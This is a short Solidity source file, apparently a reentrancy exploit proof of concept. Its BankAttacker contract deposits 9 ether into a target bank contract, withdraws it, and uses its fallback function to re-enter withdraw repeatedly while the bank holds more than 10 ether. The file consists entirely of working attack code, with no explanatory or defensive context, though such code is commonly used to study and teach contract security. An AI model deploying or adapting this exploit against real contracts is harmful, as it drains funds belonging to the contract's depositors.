// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract BankAttacker {
    address bank;

    constructor (address _bank) payable {
        bank = _bank;
    }

    function attackIt() public payable {
        require(bank.balance > 10 ether);
        IBank(bank).deposit{value : 9 ether}();
        IBank(bank).withdraw(9 ether);
    }

    fallback() external payable {
        if (bank.balance > 10 ether) {
            IBank(bank).withdraw(9 ether);
        }
    }
}
